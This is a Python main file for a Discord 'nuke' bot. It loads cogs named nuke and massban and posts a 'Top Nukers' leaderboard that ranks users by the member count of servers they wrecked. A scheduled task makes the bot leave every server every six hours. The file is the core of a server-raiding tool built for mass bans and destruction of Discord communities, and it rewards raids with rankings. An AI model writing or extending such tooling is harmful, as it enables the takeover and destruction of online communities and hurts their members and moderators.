import discord
from discord.ext import commands, tasks

from config import BLACKLISTED_GUILD_ID, LEADERBOARD_CHANNEL_ID, NUKE_STATS_FILE, intents
from core.operation import leave_all_servers, log


class MyBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.load_extension("cogs.admin")
        await self.load_extension("cogs.nuke")
        await self.load_extension("cogs.massban")
        await self.load_extension("cogs.info")
        await self.load_extension("cogs.help")
        await self.tree.sync()

    async def on_ready(self):
        print(f"Bot is online as {self.user}!")
        update_leaderboard.start()
        print("Updated leaderboard")
        await self.tree.sync()
        print("Slash commands synced.")
        auto_leave_task.start()


bot = MyBot()


@tasks.loop(minutes=10)
async def update_leaderboard():
    import json
    import os

    if not os.path.exists(NUKE_STATS_FILE):
        return

    with open(NUKE_STATS_FILE, "r") as f:
        data = json.load(f)

    leaderboard = []

    for server_id, info in data.get("servers", {}).items():
        user_id = info.get("user_id")
        member_count = info.get("member_count", 0)
        server_name = info.get("server_name", "Unknown")

        if user_id:
            leaderboard.append((user_id, member_count, server_name))

    user_best = {}
    for user_id, member_count, server_name in leaderboard:
        if user_id not in user_best or member_count > user_best[user_id][0]:
            user_best[user_id] = (member_count, server_name)

    sorted_users = sorted(user_best.items(), key=lambda x: x[1][0], reverse=True)[:10]

    embed = discord.Embed(
        title="🏆・Top Nukers (by server size)",
        color=0xa874d1
    )

    lines = ["Updated every 10 minutes\n"]

    for i, (user_id, (member_count, server_name)) in enumerate(sorted_users, 1):
        try:
            user = await bot.fetch_user(int(user_id))
            line = f"{i}. **{user.display_name}** ({user.name}) - **{server_name}**: `{member_count}` members\n"
            lines.append(line)
        except:
            continue

    embed.description = "\n".join(lines)

    channel = bot.get_channel(LEADERBOARD_CHANNEL_ID)
    if channel:
        async for msg in channel.history(limit=10):
            if msg.author == bot.user and msg.embeds:
                await msg.delete()
        await channel.send(embed=embed)


@tasks.loop(hours=6)
async def auto_leave_task():
    await leave_all_servers()


@auto_leave_task.before_loop
async def before_auto_leave():
    await bot.wait_until_ready()
